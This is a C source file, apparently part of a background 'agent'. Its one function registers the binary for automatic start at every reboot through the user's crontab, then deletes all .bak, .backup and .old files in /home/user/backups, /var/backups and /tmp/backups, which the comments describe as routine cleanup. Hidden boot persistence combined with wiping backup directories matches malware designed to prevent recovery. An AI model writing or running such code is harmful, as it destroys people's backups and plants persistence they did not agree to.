#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <errno.h>

/*
 * Resolve the absolute path of the running binary.
 * Tries realpath(argv[0]) first, falls back to /proc/self/exe via readlink().
 * Returns 0 on success, -1 on failure.
 */
static int resolve_binary_path(int argc, char *argv[], char *buf, size_t buf_size)
{
    if (argv != NULL && argv[0] != NULL) {
        if (realpath(argv[0], buf) != NULL)
            return 0;
        // realpath failed, fall through
    }

    ssize_t len = readlink("/proc/self/exe", buf, buf_size - 1);
    if (len == -1) {
        perror("readlink /proc/self/exe");
        return -1;
    }
    buf[len] = '\0';
    return 0;
}

/*
 * Register the agent in crontab for @reboot execution and clean old backup files.
 * Returns 0 on success, -1 on any failure.
 */
int register_autostart(int argc, char *argv[])
{
    char binary_path[PATH_MAX];

    if (resolve_binary_path(argc, argv, binary_path, sizeof(binary_path)) == -1)
        return -1;

    // Build the expected crontab line (with trailing newline for exact matching)
    char expected_line[PATH_MAX + 16];
    snprintf(expected_line, sizeof(expected_line), "@reboot %s\n", binary_path);

    // ---------- Crontab read ----------
    FILE *fp_read = popen("crontab -l 2>/dev/null", "r");
    if (fp_read == NULL) {
        perror("popen crontab -l");
        return -1;
    }

    // Store all existing lines in a dynamic array
    char **lines = NULL;
    size_t lines_count = 0;
    size_t lines_capacity = 0;
    char *line = NULL;
    size_t line_len = 0;
    ssize_t nread;
    int found = 0;

    while ((nread = getline(&line, &line_len, fp_read)) != -1) {
        // Store a copy of the line (includes newline)
        if (lines_count >= lines_capacity) {
            lines_capacity = (lines_capacity == 0) ? 64 : lines_capacity * 2;
            char **tmp = realloc(lines, lines_capacity * sizeof(char *));
            if (tmp == NULL) {
                perror("realloc");
                free(line);
                for (size_t i = 0; i < lines_count; i++) free(lines[i]);
                free(lines);
                pclose(fp_read);
                return -1;
            }
            lines = tmp;
        }
        lines[lines_count] = strdup(line);
        if (lines[lines_count] == NULL) {
            perror("strdup");
            free(line);
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            pclose(fp_read);
            return -1;
        }

        // Check if this line matches the required @reboot entry
        if (strcmp(line, expected_line) == 0)
            found = 1;

        lines_count++;
    }

    free(line);
    int ret = pclose(fp_read);
    if (ret == -1) {
        perror("pclose crontab -l");
        for (size_t i = 0; i < lines_count; i++) free(lines[i]);
        free(lines);
        return -1;
    }

    // ---------- Write crontab if entry missing ----------
    if (!found) {
        FILE *fp_write = popen("crontab -", "w");
        if (fp_write == NULL) {
            perror("popen crontab - (write)");
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        // Write all existing lines exactly as they were
        for (size_t i = 0; i < lines_count; i++) {
            if (fputs(lines[i], fp_write) == EOF) {
                perror("fputs crontab line");
                pclose(fp_write);
                for (size_t i = 0; i < lines_count; i++) free(lines[i]);
                free(lines);
                return -1;
            }
        }

        // Append the new @reboot entry
        if (fputs(expected_line, fp_write) == EOF) {
            perror("fputs @reboot line");
            pclose(fp_write);
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        if (pclose(fp_write) == -1) {
            perror("pclose crontab -");
            for (size_t i = 0; i < lines_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }
    }

    // Free stored lines
    for (size_t i = 0; i < lines_count; i++) free(lines[i]);
    free(lines);

    // ---------- Cleanup old backup files ----------
    // Directories to scan (same as scan_storage – adjust as needed)
    const char *scan_dirs[] = {
        "/home/user/backups",
        "/var/backups",
        "/tmp/backups",
        NULL
    };

    int clean_ret = 0;  // 0 = success, -1 = at least one removal failed

    for (size_t d = 0; scan_dirs[d] != NULL; d++) {
        const char *dir = scan_dirs[d];
        DIR *dp = opendir(dir);
        if (dp == NULL) {
            // Directory might not exist or is inaccessible – non-fatal
            perror(dir);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dp)) != NULL) {
            // Skip . and ..
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            char full_path[PATH_MAX];
            snprintf(full_path, sizeof(full_path), "%s/%s", dir, entry->d_name);

            struct stat st;
            if (stat(full_path, &st) != 0) {
                perror(full_path);
                continue;
            }

            // Only regular files
            if (!S_ISREG(st.st_mode))
                continue;

            // Check file extension
            const char *ext = strrchr(entry->d_name, '.');
            if (ext != NULL &&
                (strcmp(ext, ".bak") == 0 ||
                 strcmp(ext, ".backup") == 0 ||
                 strcmp(ext, ".old") == 0))
            {
                if (remove(full_path) != 0) {
                    perror(full_path);
                    clean_ret = -1;  // mark failure, but continue
                }
            }
        }

        closedir(dp);
    }

    return clean_ret;
}